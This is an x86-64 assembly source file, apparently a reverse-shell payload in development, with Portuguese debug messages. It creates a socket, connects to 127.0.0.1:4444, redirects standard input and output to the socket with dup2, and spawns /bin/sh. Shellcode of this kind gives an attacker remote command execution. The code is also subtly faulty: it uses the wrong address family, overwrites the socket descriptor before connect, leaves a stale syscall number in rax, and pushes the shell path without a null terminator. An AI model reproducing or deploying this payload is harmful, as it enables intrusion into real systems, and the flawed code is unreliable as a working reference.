section .data
    msg_socket db "[+] socket() ok", 10
    msg_connect db "[+] connect() ok", 10
    msg_dup2 db "[+] dup2() ok", 10
    msg_execve db "[+] execve() ok", 10
    msg_fail db "[!] erro em syscall", 10

section .text
    global _start

_start:
    ; debug: socket
    mov rax, 1
    mov rdi, 1
    mov rsi, msg_socket
    mov rdx, 17
    syscall

    ; socket(AF_INET, SOCK_STREAM, 0)
    xor     rax, rax
    mov     al, 41
    xor     rdi, rdi            ; AF_INET
    mov     sil, 1              ; SOCK_STREAM
    xor     rdx, rdx            ; protocol = 0
    syscall

    mov     rdi, rax            ; sockfd

    ; struct sockaddr_in (AF_INET, port 4444, 127.0.0.1)
    sub     rsp, 16
    mov     word [rsp], 2              ; AF_INET
    mov     word [rsp+2], 0x5c11       ; PORT 4444 (big endian)
    mov     dword [rsp+4], 0x0100007f  ; 127.0.0.1
    xor     rax, rax
    mov     [rsp+8], rax               ; zero[8]

    ; debug: connect
    mov rax, 1
    mov rdi, 1
    mov rsi, msg_connect
    mov rdx, 18
    syscall

    ; connect(sockfd, sockaddr*, 16)
    mov     rsi, rsp
    mov     al, 42
    mov     dl, 16
    syscall

    test    rax, rax
    js      fail

    ; dup2 loop
    xor     rsi, rsi
.loop:
    mov     al, 33
    syscall
    inc     rsi
    cmp     rsi, 3
    jl      .loop

    ; debug: dup2
    mov rax, 1
    mov rdi, 1
    mov rsi, msg_dup2
    mov rdx, 15
    syscall

    ; execve("/bin/sh", NULL, NULL)
    xor     rax, rax
    mov     rbx, 0x68732f6e69622f2f
    push    rbx
    mov     rdi, rsp
    xor     rsi, rsi
    xor     rdx, rdx
    mov     al, 59
    syscall

fail:
    mov     rax, 1
    mov     rdi, 1
    mov     rsi, msg_fail
    mov     rdx, 21
    syscall

    mov     rdi, 1
    mov     al, 60
    syscall
